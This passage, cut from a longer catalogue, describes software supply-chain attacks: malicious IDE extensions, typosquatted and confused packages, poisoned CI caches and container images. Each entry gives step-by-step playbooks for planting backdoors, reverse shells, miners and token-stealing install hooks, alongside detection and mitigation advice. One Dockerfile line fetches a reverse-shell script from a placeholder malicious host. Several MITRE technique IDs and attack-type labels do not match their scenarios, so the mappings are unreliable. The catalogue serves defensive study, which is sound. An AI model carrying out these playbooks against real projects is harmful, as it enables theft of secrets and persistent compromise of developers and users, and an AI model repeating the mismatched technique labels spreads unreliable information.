- **Vulnerability**: Lack of extension sandboxing
- **MITRE**: T1556.004
- **Impact**: Persistent stealthy backdoor in production code
- **Tools**: VSCode Extensions, JavaScript
- **Scenario**: The attacker distributes a malicious Visual Studio Code extension which silently alters code or inserts malicious imports during development time, before code even reaches source control.
- **Attack Steps**: 1. Create a VSCode extension that masquerades as a useful tool (e.g., “Code Formatter Pro”). 2. Embed code to hook into file save events and inject payloads into .js, .py, or .ts files. 3. Publish to the public VSCode marketplace. 4. Developers install the extension for its advertised features.5. While working on code, the extension silently alters logic, e.g., adding require('malicious-lib').6. These changes propagate to source control and deployment.7. The backdoor is now part of the official product codebase without detection.
- **Detection**: Monitor file diffs before commits; alert on unknown imports
- **Solution**: Restrict dev extensions to whitelisted list; audit installed extensions
- **Tags**: IDE, VSCode, Dev Environment, Extension Abuse

## Poisoning Container Images via Compromised Base Layers

- **Attack Type**: Container Supply Chain Poisoning
- **Target**: Docker Systems
- **Vulnerability**: Insecure distribution of container base images
- **MITRE**: T1601.002
- **Impact**: Runtime compromise across multiple container deployments
- **Tools**: Docker Hub, Docker CLI
- **Scenario**: Attackers compromise popular base images (e.g., ubuntu:latest, node:14) by injecting backdoors or malicious binaries, affecting all downstream Docker builds that inherit from them.
- **Attack Steps**: 1. Identify open-source Docker images that are widely used as base layers. 2. Fork the Dockerfile repo or compromise credentials to the official maintainer. 3. Modify the Dockerfile to include hidden backdoors or crypto miners (e.g., in RUN or entrypoint). 4. Rebuild and publish the modified image.5. Tag it with the same or similar name (e.g., typo-squatting: nodde:14).6. Downstream projects unknowingly pull the poisoned image.7. Once containers are built, malicious processes are embedded and executed inside runtime.
- **Detection**: Image scanning tools like Trivy, Clair
- **Solution**: Use trusted image registries; enable image signing
- **Tags**: Docker, Image Poisoning, Container Security

## Python Wheel (.whl) Binary Payload Injection

- **Attack Type**: Language Package Binary Injection
- **Target**: Developers
- **Vulnerability**: Trust in binary wheels without validation
- **MITRE**: T1608.004
- **Impact**: Stealthy malware hidden in seemingly legit Python libraries
- **Tools**: Python, PyPI, setuptools
- **Scenario**: The attacker tampers with compiled Python .whl (wheel) binary distributions to inject malware that activates upon install, bypassing source-level code review mechanisms.
- **Attack Steps**: 1. Select a Python project with prebuilt .whl distributions.2. Download and reverse-engineer the .whl file to understand structure.3. Modify compiled .so or .pyd modules to embed payloads.4. Repackage the wheel using setuptools.5. Re-upload using a typo-squat or compromise account.6. When users install using pip, the malicious code silently executes from native binary components.7. Payload runs with Python process privileges, potentially installing persistent backdoors or stealing tokens.
- **Detection**: Monitor wheel contents; diff source vs binary
- **Solution**: Build from source when possible; disable binary installs
- **Tags**: Python, Binary Payload, Wheels, PyPI, Obfuscated Malware

## Altered .deb Packages via PPA Hijacking

- **Attack Type**: Package Repository Attack
- **Target**: Linux Systems
- **Vulnerability**: PPA mismanagement and lack of validation
- **MITRE**: T1608.006
- **Impact**: Root access or persistence on user systems via legit packages
- **Tools**: apt, Launchpad, Ubuntu PPAs
- **Scenario**: Attacker hijacks or impersonates a Personal Package Archive (PPA) on Ubuntu, modifying .deb packages with rootkits that execute upon package installation.
- **Attack Steps**: 1. Discover inactive or poorly secured PPAs used by popular software.2. Take control via forgotten email or contact impersonation.3. Upload malicious .deb packages with post-installation scripts or hidden cron jobs.4. Wait for automatic or user-initiated system updates.5. On apt upgrade, modified package gets installed.6. Post-install scripts create persistence or open network sockets.7. Attacker can now remotely access or modify system behavior.
- **Detection**: Monitor PPA sources; verify package GPG signatures
- **Solution**: Use official repos; audit PPA security
- **Tags**: Debian, APT, PPA, Package Hijacking

## Tampering GitHub Actions Cache to Inject Malicious Binaries

- **Attack Type**: CI/CD Artifact Cache Poisoning
- **Target**: CI/CD Pipelines
- **Vulnerability**: Shared cache not isolated per repo
- **MITRE**: T1554
- **Impact**: Compromised builds and artifacts from poisoned cache
- **Tools**: GitHub Actions, Node.js
- **Scenario**: Attackers exploit GitHub Actions' shared cache system by injecting malicious binaries or dependencies into cache keys used across multiple builds or workflows.
- **Attack Steps**: 1. Fork a project that uses actions/cache to speed up builds (e.g., cache Node modules).2. Craft a build that poisons the shared cache key (e.g., node-cache-v1).3. Push to a branch and trigger CI to upload a cache filled with malicious .js or .so files.4. When upstream project pulls the same key, malicious files are restored into the workflow.5. These are then executed in builds or test runs.6. If those builds generate release artifacts, the attacker’s code gets shipped downstream.
- **Detection**: Hash cache contents; restrict cache scope
- **Solution**: Use unique cache keys per workflow; monitor unexpected restores
- **Tags**: GitHub, Cache Poisoning, CI/CD, Build Integrity

## Replacing SCM Hook Scripts with Malicious Versions

- **Attack Type**: Source Control Hook Tampering
- **Target**: Developers
- **Vulnerability**: Git hooks not tracked in source control
- **MITRE**: T1564.001
- **Impact**: Silent exfiltration and developer compromise
- **Tools**: Git, Bash, Python
- **Scenario**: Attacker compromises a source code repository and replaces pre-commit or post-merge hooks with scripts that embed backdoors or leak data during developer operations.
- **Attack Steps**: 1. Gain access to a developer’s machine or repo (via phishing or malware).2. Modify .git/hooks/pre-commit or .git/hooks/post-merge to include malicious shell or Python commands.3. These scripts now run automatically on commit or pull.4. Payloads can leak code to external IPs, steal SSH tokens, or install persistence.5. Since these are outside tracked files, they may evade detection unless hooks are specifically monitored.6. Over time, as the repo is cloned or shared, these hooks spread.7. Every developer who enables hooks unknowingly runs attacker’s code.
- **Detection**: Monitor for changes in .git/hooks/; use secure repos
- **Solution**: Disable hook execution globally or enforce signed hooks
- **Tags**: Git, Hooks, SCM Tampering, Developer Backdoor

## Remote File Inclusion in Jenkins Shared Libraries

- **Attack Type**: CI/CD Code Injection via Libraries
- **Target**: CI/CD Systems
- **Vulnerability**: Unvalidated shared script execution
- **MITRE**: T1609
- **Impact**: Complete CI pipeline compromise across org
- **Tools**: Jenkins, Groovy, Git
- **Scenario**: Attacker modifies shared Jenkins libraries to include remote file inclusion (RFI), enabling arbitrary code execution in Jenkins jobs across multiple pipelines.
- **Attack Steps**: 1. Identify organizations using Jenkins Shared Libraries from GitHub or internal Git. 2. Gain access to the library repo via GitHub token compromise or internal access.3. Modify library scripts to fetch and execute code from attacker’s server (e.g., eval(new URL("..."))).4. Commit and push changes with legitimate-looking messages.5. Jenkins pipelines automatically include updated libraries.6. When a pipeline job runs, the attacker’s payload is fetched live.7. This enables real-time control over build machines, including access to secrets or internal artifacts.
- **Detection**: Monitor shared library commits and usage
- **Solution**: Enforce static library loading; disallow dynamic inclusions
- **Tags**: Jenkins, RFI, CI/CD Libraries, Remote Payload

## Exploiting Cloud Build Triggers via Insecure Webhooks

- **Attack Type**: CI/CD Webhook Exploitation
- **Target**: CI/CD Systems
- **Vulnerability**: Unauthenticated or public build trigger URLs
- **MITRE**: T1190
- **Impact**: Trigger unauthorized builds and exfiltrate results
- **Tools**: Google Cloud Build, curl
- **Scenario**: Attackers abuse exposed or unauthenticated build trigger webhooks (e.g., GitHub → Google Cloud Build) to initiate builds that compile malicious code or leak secrets.
- **Attack Steps**: 1. Discover misconfigured build triggers with public webhook URLs (via Shodan or GitHub).2. Use curl or scripts to POST fake commits or payloads to the endpoint.3. The trigger causes the build pipeline to activate.4. Inject malicious environment variables or tampered build scripts into the triggered payload.5. Build process executes attacker’s code or uploads sensitive logs to external server.6. May result in malicious containers, artifacts, or exfiltration of build secrets.7. Attacker can repeat this without detection if webhook access is unrestricted.
- **Detection**: Monitor build trigger initiations and IP addresses
- **Solution**: Use signed webhooks or IP filtering; validate payload sources
- **Tags**: Cloud Build, Webhook Attack, CI/CD Pipeline

## Poisoning GitHub Actions via External Pull Requests

- **Attack Type**: CI/CD Poisoning via PR
- **Target**: Open-Source CI/CD
- **Vulnerability**: Auto-run PR Builds
- **MITRE**: T1059, T1203
- **Impact**: Secret theft, repo compromise, potential lateral movement
- **Tools**: GitHub, GitHub Actions, NPM
- **Scenario**: An attacker submits a malicious PR to an open-source repo, triggering GitHub Actions workflows that auto-install dependencies and run code.
- **Attack Steps**: 1. The attacker forks a popular GitHub repository that uses GitHub Actions for CI builds. 2. They modify a file (e.g., README.md) to trigger a pull request. 3. In the pull request, they include a malicious payload in a file that will be interpreted or installed during build (e.g., injecting code into package.json scripts). 4. The maintainer merges or CI auto-runs the workflow. 5. GitHub Actions installs dependencies and executes the preinstall script that runs the malicious code, possibly exfiltrating secrets or tokens.
- **Detection**: Monitor GitHub Actions logs, alert on external PRs triggering builds
- **Solution**: Disable auto-run workflows for PRs from forks; use manual approval gates
- **Tags**: #github-actions #pr-poisoning #ci-cd #supply-chain

## Compromising Docker Hub Images with Obfuscated Malware

- **Attack Type**: Malicious Container Distribution
- **Target**: Container Registry
- **Vulnerability**: Trust in Public Images
- **MITRE**: T1204.003, T1059
- **Impact**: Remote execution, persistence, CI pipeline compromise
- **Tools**: Docker, Bash, Shc, Base64
- **Scenario**: Attacker uploads a Docker image with malware obfuscated via base64 and hidden in entrypoint scripts to Docker Hub.
- **Attack Steps**: 1. The attacker builds a Docker image that appears to be useful (e.g., alpine-node-debug) but includes a base64-encoded malware script. 2. The script is executed via the container's ENTRYPOINT, where it downloads a second-stage payload or installs a reverse shell. 3. The image is uploaded to Docker Hub with tags resembling popular projects. 4. Developers mistakenly pull this image into their CI/CD or runtime environment. 5. Upon container start, the malware runs, potentially infecting internal systems or stealing tokens.
- **Detection**: Monitor outbound traffic from containers, image scanning
- **Solution**: Always verify and sign images; use internal registries with trusted sources
- **Tags**: #dockerhub #container-malware #supply-chain

## Dependency Confusion in Enterprise Monorepo via Misnamed Package

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Build System
- **Vulnerability**: Improper Dependency Resolution Order
- **MITRE**: T1195.002
- **Impact**: Secret exfiltration, poisoned builds
- **Tools**: NPM, Yarn, MITMProxy
- **Scenario**: Exploiting unscoped internal dependency names used in an enterprise monorepo by uploading a public package with same name.
- **Attack Steps**: 1. The attacker identifies an internal monorepo project that references a private dependency named utils-core. 2. They upload a malicious utils-core package to the public NPM registry with a higher version number. 3. The CI/CD pipeline, misconfigured to allow public registry fallback, downloads the attacker's version. 4. The malicious code executes as part of the build, potentially leaking credentials or modifying output binaries. 5. The attacker receives internal secrets via webhook or DNS exfiltration.
- **Detection**: Dependency source validation, monitor unusual registry pulls
- **Solution**: Pin internal dependencies with exact versions, use private registries strictly
- **Tags**: #dependencyconfusion #npm #internalmonorepo

## Typosquatting PyPI Package for Cryptojacking

- **Attack Type**: Malicious Package Injection
- **Target**: Developer Workstation
- **Vulnerability**: Typo and Package Misuse
- **MITRE**: T1195.001
- **Impact**: Resource abuse, stealthy malware
- **Tools**: PyPI, Python, pip
- **Scenario**: The attacker uploads a PyPI package with a name similar to a legitimate one (reqeusts vs requests) that contains cryptojacking code.
- **Attack Steps**: 1. The attacker creates a Python package called reqeusts with setup.py containing a script that spawns a background Monero miner. 2. They upload it to PyPI with a legitimate-looking README and versioning. 3. A developer mistypes pip install reqeusts in a script or CI environment. 4. The cryptominer runs in the background, stealing CPU resources. 5. Since it’s installed as a dependency, it might go unnoticed for days.
- **Detection**: Monitor CPU usage and pip logs, alert on uncommon packages
- **Solution**: Enable pip hash verification, restrict package installs to vetted names
- **Tags**: #pypi #typosquatting #cryptojacking #supply-chain

## Hijacking Internal Terraform Module via Public Repo Overlap

- **Attack Type**: IaC Module Poisoning
- **Target**: Terraform Pipelines
- **Vulnerability**: Source Ambiguity in IaC Modules
- **MITRE**: T1195.002, T1608.003
- **Impact**: Backdoor in infrastructure, unauthorized access
- **Tools**: Git, Terraform
- **Scenario**: Internal IaC refers to a module source by Git URL; attacker registers the same repo name publicly and poisons the module code.
- **Attack Steps**: 1. The attacker finds a leaked Terraform configuration referencing a module from a Git source: git::https://gitlab.com/acme-infra/mod-network. 2. They create a public GitLab project with the same name and upload a malicious main.tf. 3. The internal environment misresolves or fails over to public source due to firewall/proxy rules. 4. On next terraform init, the poisoned module gets pulled. 5. Malicious resources (backdoor security groups, logging exfil) are provisioned silently.
- **Detection**: Monitor external Git requests, validate module signatures
- **Solution**: Pin module SHAs, use private registries for IaC modules
- **Tags**: #terraform #iac #modulehijack #supply-chain

## Malicious Composer Package with Laravel Backdoor

- **Attack Type**: PHP Ecosystem Abuse
- **Target**: PHP Web Application
- **Vulnerability**: Abuse of Middleware Injection
- **MITRE**: T1203, T1505
- **Impact**: Remote access, full app compromise
- **Tools**: Composer, PHP, Laravel
- **Scenario**: A PHP package uploaded to Packagist contains hidden Laravel middleware to allow remote execution.
- **Attack Steps**: 1. The attacker writes a package named laravel-utils-helper, mimicking common utility libraries. 2. In the package, they insert middleware that listens for a secret header (e.g., X-CMD) and runs shell commands. 3. Developers include this package in Laravel apps unknowingly. 4. In production, the attacker sends HTTP requests with the secret header and executes commands. 5. The application becomes a remote shell interface without being detected by normal users.
- **Detection**: HTTP request analysis, middleware diffing
- **Solution**: Vet all 3rd-party packages, disable untrusted middleware
- **Tags**: #php #composer #laravel #backdoor #supply-chain

## Bitbucket Pipeline Poisoning via Script Injection in Commit

- **Attack Type**: CI/CD Pipeline Compromise
- **Target**: Bitbucket CI/CD
- **Vulnerability**: Improper Input Sanitization in Pipelines
- **MITRE**: T1059, T1203
- **Impact**: CI takeover, artifact poisoning
- **Tools**: Bitbucket, Bash, CI Scripts
- **Scenario**: A script embedded in a commit message or comment gets interpreted during pipeline execution, hijacking the build process.
- **Attack Steps**: 1. Attacker contributes to a Bitbucket project with an auto-triggered pipeline. 2. They embed shell commands inside commit messages or comments. 3. CI scripts naïvely parse commit messages into environment variables or scripts (e.g., for changelogs). 4. The embedded code is executed during the next build job. 5. The attacker gains access to build logs, tokens, or artifacts.
- **Detection**: Sanitize inputs, escape commit messages in pipeline scripts
- **Solution**: Avoid dynamic script generation from commits/comments
- **Tags**: #bitbucket #pipeline-injection #ci-cd

## Public Mirror Poisoning of Private Maven Repository

- **Attack Type**: Build Artifact Poisoning
- **Target**: Java Build System
- **Vulnerability**: Unsafe Fallback Mechanism
- **MITRE**: T1195.002
- **Impact**: Artifact poisoning, RCE
- **Tools**: Maven, Java, HTTP Proxy
- **Scenario**: A private Maven repo relies on public mirrors for fallbacks. Attacker hosts a poisoned mirror with similar artifacts.
- **Attack Steps**: 1. Attacker observes a corporate Maven build that fails over to http://mirror1.example.com when the internal repo is unavailable. 2. They create a public Maven mirror with the same path and host it online. 3. They upload poisoned .jar files with valid metadata (but malicious bytecode). 4. Developer CI fails over and pulls from the malicious mirror. 5. The infected .jar is executed, triggering malicious behavior.
- **Detection**: Audit jar file signatures, disable unknown mirrors
- **Solution**: Always verify checksum and enforce trusted mirror settings
- **Tags**: #maven #mirrorpoison #java #supply-chain

## Exploiting Vendor NPM Scope Leak

- **Attack Type**: Scoped Package Impersonation
- **Target**: Node.js Frontend
- **Vulnerability**: Unclaimed NPM Scopes
- **MITRE**: T1195.001, T1608
- **Impact**: JS backdoor, front-end compromise
- **Tools**: NPM, Node.js
- **Scenario**: Attacker registers a scoped package like @acme-ui/button if a vendor's scoped namespace was never claimed publicly.
- **Attack Steps**: 1. The attacker discovers a company uses packages like @acme-ui/button internally. 2. They check the NPM registry and find @acme-ui scope is unclaimed. 3. Attacker registers the scope and publishes @acme-ui/button with malicious code. 4. Devs running npm install without scoped registry restrictions accidentally install the attacker's version. 5. Code is executed during the install lifecycle or at runtime.
- **Detection**: Restrict scope resolution to private registries
- **Solution**: Register your namespace publicly even if private; restrict scopes
- **Tags**: #npm #scopes #js-backdoor #supply-chain

## Dockerfile BuildKit Secret Leak via Shared Context

- **Attack Type**: Build Secrets Exposure
- **Target**: Container Build System
- **Vulnerability**: Misuse of Docker Secrets Injection
- **MITRE**: T1552.001
- **Impact**: Secret leakage during build phase
- **Tools**: Docker BuildKit
- **Scenario**: An attacker poisons a shared Docker build context and steals secrets injected via BuildKit’s --secret flag.
- **Attack Steps**: 1. Developer uses --secret flag in Docker BuildKit to inject credentials into a build. 2. The build context includes a third-party cloned repo or mounted directory. 3. Attacker modifies Dockerfile in that context to cat the secret and send it to an external server. 4. The build executes, exposing the secret to the attacker. 5. Developer remains unaware since secrets aren’t visible in final image.
- **Detection**: Monitor build logs, validate Dockerfile ownership
- **Solution**: Isolate build contexts and control file access in Docker builds
- **Tags**: #docker #buildkit #secretleak #supply-chain

## Dependency Confusion via CI Cache Poisoning

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD pipelines with caching
- **Vulnerability**: Cache reuse with untrusted source
- **MITRE**: T1195.002
- **Impact**: CI execution of trojaned modules
- **Tools**: NPM, GitHub Actions cache, verdaccio
- **Scenario**: Instead of overriding private packages, attacker poisons a build cache (e.g., GitHub Actions or Jenkins) with a malicious public dependency version before a real developer's CI run.
- **Attack Steps**: 1. Attacker finds a public GitHub repo using an internal package @corp/api-tools. 2. They observe CI caching in .github/workflows, which stores node_modules or NPM cache. 3. Attacker forks the repo and modifies package.json to reference a public package @corp/api-tools (created and published by them). 4. They publish version 99.9.9 to NPM, then push a PR with minor edits to trigger GitHub Actions. 5. The CI cache saves the poisoned package. 6. When a maintainer merges PR and runs CI on the main repo, it reuses the poisoned cache — loading the attacker's code. 7. The malicious postinstall script sends secrets via curl to a webhook.
- **Detection**: Monitor cache for unknown packages; audit postinstall scripts
- **Solution**: Disable cross-PR cache reuse, hash-verify dependencies
- **Tags**: #npm #cachepoisoning #githubactions

## Clipboard Hijacking via VSCode Extension Dependency

- **Attack Type**: Malicious Library
- **Target**: Developer IDE environments
- **Vulnerability**: Indirect clipboard hijacking via extensions
- **MITRE**: T1059.006
- **Impact**: Silent user-level hijack during coding
- **Tools**: PyPI, VSCode, Python clipboard libs
- **Scenario**: Attacker publishes a dependency that is secretly included in a VSCode extension, silently enabling clipboard monitoring across developer machines.
- **Attack Steps**: 1. Attacker publishes a benign-looking Python library pyutils-helper to PyPI. 2. The library internally depends on a hidden module py-clipwatcher, which isn't well documented. 3. A third-party VSCode extension for Python enhancement uses pyutils-helper to simplify code. 4. When developers install the extension, the entire dependency tree is fetched. 5. During use, py-clipwatcher activates a script that checks clipboard for wallet addresses. 6. If found, it replaces them with attacker-controlled values. 7. This runs in the background without user knowledge as long as the extension is active.
- **Detection**: Clipboard anomalies, unknown network requests from extensions
- **Solution**: Vet third-party extensions; analyze all sub-dependencies
- **Tags**: #pypi #vscode #indirectattack

## GitHub Action Backdoor via Artifact Upload Script

- **Attack Type**: CI/CD Injection
- **Target**: GitHub CI pipelines, open source repos
- **Vulnerability**: Obfuscated script injection in CI workflows
- **MITRE**: T1056.001
- **Impact**: Secret leakage in disguised legitimate actions
- **Tools**: GitHub Actions, curl, shell scripts
- **Scenario**: A GitHub Action performs a real task (artifact upload) but also steals environment secrets by modifying shell scripts used within the action.
- **Attack Steps**: 1. Attacker forks a popular GitHub Action upload-artifact-v2 and creates a similarly named one upload-artifact-v2-secure. 2. Inside the entrypoint.sh, they add a line to read environment variables (printenv) and send them to a remote server via curl. 3. The action still performs its expected job (artifact upload), so detection is hard. 4. A target project adds this fake action, mistaking it for a secure upgrade. 5. During workflow execution, the action runs, uploading the artifact and the secrets. 6. Attacker collects credentials like GitHub tokens, AWS keys, and uses them for further access.
- **Detection**: Monitor outbound requests from actions; diff-check forks
- **Solution**: Use only Actions with verified authorship; inspect entrypoint.sh manually
- **Tags**: #github #backdoor #artifact

## PyPI Dependency with Encrypted Payload Loader

- **Attack Type**: Malicious Library
- **Target**: Backend servers, dev machines
- **Vulnerability**: Runtime payload obfuscation
- **MITRE**: T1203
- **Impact**: Reverse shell without obvious artifacts
- **Tools**: PyPI, base64, Python AES module
- **Scenario**: A PyPI package hides a reverse shell trigger inside an encrypted string that gets decrypted and executed at runtime via eval, evading static detection.
- **Attack Steps**: 1. Attacker builds a Python package pycolorx that appears to offer enhanced color output for terminals. 2. Inside __init__.py, they include an encrypted string containing reverse shell payload (e.g., AES-encrypted Python code). 3. A custom function uses a hardcoded key to decrypt the payload at runtime, then uses exec() to run it. 4. The malicious function is embedded within a utility method like format_text(), which the developer eventually calls. 5. Upon import or function use, a reverse shell is initiated to a remote C2 server. 6. Attacker gets terminal access to the web app server where the package runs.
- **Detection**: Monitor runtime behavior for suspicious exec/eval
- **Solution**: Disallow packages using dynamic code execution
- **Tags**: #pypi #encryptedpayload #evasivemalware

## NPM Preinstall Script with VM Detection and Crypto Mining

- **Attack Type**: Malicious Library
- **Target**: Developer endpoints, non-CI machines
- **Vulnerability**: Abuse of preinstall, VM evasion
- **MITRE**: T1496
- **Impact**: Long-term cryptojacking with stealth
- **Tools**: NPM, Node.js, Monero miner
- **Scenario**: A malicious NPM package performs anti-VM checks before activating Monero mining in real environments to avoid sandbox detection.
- **Attack Steps**: 1. Attacker publishes a package env-info-lite to NPM with seemingly harmless scripts. 2. In preinstall, they run a lightweight anti-VM check (checking MAC addresses, available RAM, process list). 3. If it passes the check (i.e., not a sandbox or CI runner), the script downloads and installs a Monero mining binary. 4. The miner is launched using a child process with low priority and logs are redirected to /dev/null. 5. The package logs "installation successful" to mask the background activity. 6. The miner operates indefinitely in the background, draining CPU from the victim system.
- **Detection**: Look for install scripts accessing system internals
- **Solution**: Use --ignore-scripts, monitor long CPU spikes post-install
- **Tags**: #npm #vmawaremalware #cryptomining

## Transitive Dependency Attack via Package Name Collision

- **Attack Type**: Transitive Dependency Injection
- **Target**: CI pipelines, internal monorepos
- **Vulnerability**: Namespace collision in transitive trees
- **MITRE**: T1195.002
- **Impact**: Secrets leak through unnoticed modules
- **Tools**: NPM, Yarn, Registry spoofing
- **Scenario**: Attacker creates a benign-looking package name identical to a transitive internal module, leading to silent injection in nested dependency trees.
- **Attack Steps**: 1. Attacker notices that super-app-framework depends on tiny-tools-lib, which in turn references a package called internal-uuid. 2. They register a public version of internal-uuid with higher semver on NPM. 3. During a fresh install in CI where the internal registry is not prioritized properly, npm resolves to the public internal-uuid. 4. This malicious package includes code that captures ENV variables on install and sends them to a webhook. 5. The impact goes unnoticed because the top-level app never directly depends on this module. 6. Sensitive secrets are leaked from apps that indirectly resolve to the attacker’s module.
- **Detection**: Inspect lockfiles and full resolved dependency trees
- **Solution**: Enforce scoped registries for all internal packages
- **Tags**: #npm #transitiveattack #namespacecollision

## Maintainer Targeted via OAuth Token Theft in DevTool

- **Attack Type**: Insider Threat
- **Target**: Package registries, extension users
- **Vulnerability**: Credential session hijack via browser extension
- **MITRE**: T1078
- **Impact**: Massive downstream compromise
- **Tools**: PyPI, OAuth, Developer browser
- **Scenario**: Rather than phishing, attacker harvests a maintainer's auth token via a devtool exploit, then abuses access to push a backdoored release.
- **Attack Steps**: 1. Attacker creates a malicious developer browser extension (e.g., for formatting JSON) and publishes it on the Chrome Web Store. 2. A PyPI maintainer installs the extension and uses it regularly. 3. The extension monitors active tabs and detects when the maintainer logs into pypi.org. 4. It extracts session tokens or OAuth credentials via JavaScript and sends them to the attacker's server. 5. Using the stolen session, attacker logs into PyPI as the maintainer and pushes a new version (e.g., pkg-utils==2.2.0) containing telemetry exfiltration logic. 6. Thousands of devs auto-upgrade, and attacker siphons secrets from all installations.
- **Detection**: Monitor for unknown sessions or sudden push events
- **Solution**: Restrict login sources, enforce WebAuthn, disable session reuse
- **Tags**: #pypi #oauthsteal #browsersupplychain

## Terraform Registry Redirect to Malicious GitHub Release

- **Attack Type**: Infrastructure Dependency Injection
- **Target**: DevOps teams using custom providers
- **Vulnerability**: Trusting GitHub-hosted binaries without checksum validation
- **MITRE**: T1203
- **Impact**: Unauthorized access to cloud infrastructure
- **Tools**: Terraform, GitHub Releases, Golang
- **Scenario**: A malicious Terraform provider links to a real-looking GitHub release page that hosts a backdoored binary disguised as an official version.
- **Attack Steps**: 1. Attacker forks a popular Terraform provider like terraform-provider-gcp. 2. Changes its source path in documentation to github.com/google/gcp-provider-fork. 3. Attacker then creates GitHub releases with precompiled binaries that mimic official ones but include malicious Go payloads. 4. Developer adds the provider using source = "github.com/google/gcp-provider-fork" assuming it's official. 5. On terraform init, Terraform fetches the binary from the GitHub release and executes it. 6. Binary contains logic to collect AWS credentials from environment variables and post them to the attacker's webhook. 7. Credentials are later used for unauthorized AWS actions.
- **Detection**: Monitor binary downloads and compare hash checksums
- **Solution**: Pin provider versions and use official registries only
- **Tags**: #terraform #githubreleases #cloudleak

## RubyGem Backdoor via Native Extension

- **Attack Type**: Malicious Library
- **Target**: Ruby on Rails projects
- **Vulnerability**: Native code execution inside gems
- **MITRE**: T1005
- **Impact**: Leaks of config files with DB/API secrets
- **Tools**: RubyGems, C extension in Ruby
- **Scenario**: Instead of exfiltrating logs, a RubyGem with native C extension performs low-level file reads of secret files like database.yml.
- **Attack Steps**: 1. Attacker writes a gem named col0rizex, a near clone of colorize, but includes a native C extension. 2. In the C code, they open and read common secret files like config/database.yml and .env. 3. The gem posts this content to a remote HTTP server via Net::HTTP. 4. Developers install the gem in production or staging environments unknowingly. 5. As soon as Rails loads the gem, the extension silently executes and leaks secrets. 6. Attacker uses DB credentials for exfiltration or access.
- **Detection**: Inspect gems with native code, monitor HTTP exfil
- **Solution**: Limit gem usage to known hashes; audit native extensions
- **Tags**: #rubygems #nativecode #dataleak

## Docker Build Step Injects Backdoor via ADD URL

- **Attack Type**: Container Supply Chain
- **Target**: Docker-based apps or CI pipelines
- **Vulnerability**: Unverified external resource in Dockerfile
- **MITRE**: T1608.006
- **Impact**: Remote shell access during container build
- **Tools**: Docker, Custom HTTP server
- **Scenario**: Instead of replacing a base image, attacker hosts a malicious shell script and tricks Dockerfiles into pulling it during build via an ADD from URL.
- **Attack Steps**: 1. Attacker hosts a malicious setup.sh on http://malicious-server.com/setup.sh, which includes code to open a reverse shell. 2. They release a public Dockerfile template or GitHub gist showing usage like ADD http://malicious-server.com/setup.sh /tmp/setup.sh. 3. Developers copy-paste this Dockerfile into their CI without verifying the URL. 4. During the image build, Docker fetches the script and places it into the container. 5. The script is later executed during build or at runtime, initiating a reverse shell. 6. Attacker connects to running containers and exfiltrates secrets or pivots into cloud infra.
- **Detection**: Inspect Dockerfiles for remote ADD/COPY usage
- **Solution**: Avoid external URLs in Dockerfiles; self-host all assets
- **Tags**: #docker #buildstepattack #reverse_shell

## NPM Token Theft via Homograph Package

- **Attack Type**: Malicious Library
- **Target**: Developer machines and internal CI
- **Vulnerability**: Homograph attack bypassing human review
- **MITRE**: T1557.003
- **Impact**: Unauthorized access to private NPM repos
- **Tools**: NPM, Unicode characters, node-fetch
- **Scenario**: Instead of stealing .npmrc directly, attacker creates a homograph NPM package name using Unicode trick to impersonate a trusted package.
- **Attack Steps**: 1. Attacker registers a package called reaсt-utils where the letter c is a Cyrillic с, visually identical to the Latin c. 2. Inside the package, a preinstall hook runs a script that silently checks for the presence of .npmrc file and parses it. 3. It reads auth tokens scoped to orgs or registries and base64-encodes them. 4. Then, it exfiltrates them using fetch() to a remote server. 5. Developers installing the package think it's a legitimate utility for React. 6. Attacker uses tokens to publish poisoned packages into private orgs.
- **Detection**: Monitor package metadata and install logs
- **Solution**: Use lockfiles and package name verification tooling
- **Tags**: #npm #unicodeattack #tokensteal

## Malicious Java Dependency Injected via Javadoc Link

- **Attack Type**: Malicious Library
- **Target**: Java web developers using IDEs
- **Vulnerability**: Javadoc-based dependency injection via IDE
- **MITRE**: T1055
- **Impact**: Remote JVM access, persistence
- **Tools**: Maven, IntelliJ IDEA, Java Javadoc
- **Scenario**: Instead of a JAR typo, attacker injects a malicious dependency via manipulated Javadoc HTML reference that IDEs auto-import.
- **Attack Steps**: 1. Attacker hosts a fake spring-webmvc Javadoc site with a pom.xml file containing a malicious dependency link. 2. They promote it on forums or StackOverflow as “enhanced docs with examples.” 3. Developer opens the Javadoc in IntelliJ, which auto-suggests the library via Maven coordinates. 4. Dev unknowingly adds the malicious dependency, which contains a static initializer opening a socket to a C2 server. 5. On app launch, the class runs during classloading and connects to attacker. 6. Attacker maintains persistent access to the JVM with command execution capabilities.
- **Detection**: Monitor unusual classes loaded at startup
- **Solution**: Disable automatic Maven imports; use trusted doc sources
- **Tags**: #java #maven #javadocattack

## Log Forwarding via Event Emitter Hijack

- **Attack Type**: Data Exfiltration
- **Target**: Node.js apps using event-driven logging
- **Vulnerability**: Event hijack via monkey-patching
- **MITRE**: T1005
- **Impact**: Stealthy exfiltration of internal data
- **Tools**: Node.js, NPM, EventEmitter
- **Scenario**: Rather than sending logs directly, a malicious NPM logger hijacks the Node.js EventEmitter to capture any emitted event and forwards them.
- **Attack Steps**: 1. Attacker creates a logger package logplus-mirror that extends EventEmitter. 2. Internally, it monkey-patches the default event emitters used in many Node.js apps (process.on, app.on). 3. All events, including errors, logins, API calls, and internal auth events, are captured and mirrored to a remote server. 4. The package still performs correct logging behavior, making it hard to spot. 5. Sensitive data such as auth tokens and errors are silently leaked. 6. Attacker aggregates logs from multiple infected apps for correlation.
- **Detection**: Monitor override of global Node.js prototypes
- **Solution**: Avoid unverified log libraries; inspect runtime patches
- **Tags**: #nodejs #loghijack #eventexfiltration

## GitHub Package Injects into Action Cache Step

- **Attack Type**: Dependency Confusion
- **Target**: CI pipelines with shared cache
- **Vulnerability**: Public package injection into CI cache flow
- **MITRE**: T1195.002
- **Impact**: Lateral secret theft via poisoned cache
- **Tools**: GitHub Actions, NPM, cache actions
- **Scenario**: Rather than relying on typos, attacker exploits the Action cache feature to poison GitHub workflows indirectly via a fake package.
- **Attack Steps**: 1. Attacker finds public repos that use actions/cache@v2 for node_modules caching. 2. They publish a fake internal package @org/utils-cache that mimics an internal dependency. 3. The CI workflow installs it unknowingly if caching logic resolves to public registry due to lack of scoped resolution. 4. Fake package includes scripts that steal process.env.GITHUB_TOKEN. 5. Since the cache is reused across builds, other forks or branches inherit the poisoned dependency. 6. Attacker collects secrets and uses them to access private repositories.
- **Detection**: Inspect cache keys and installed package versions
- **Solution**: Use scoped registries, disable unverified package caching
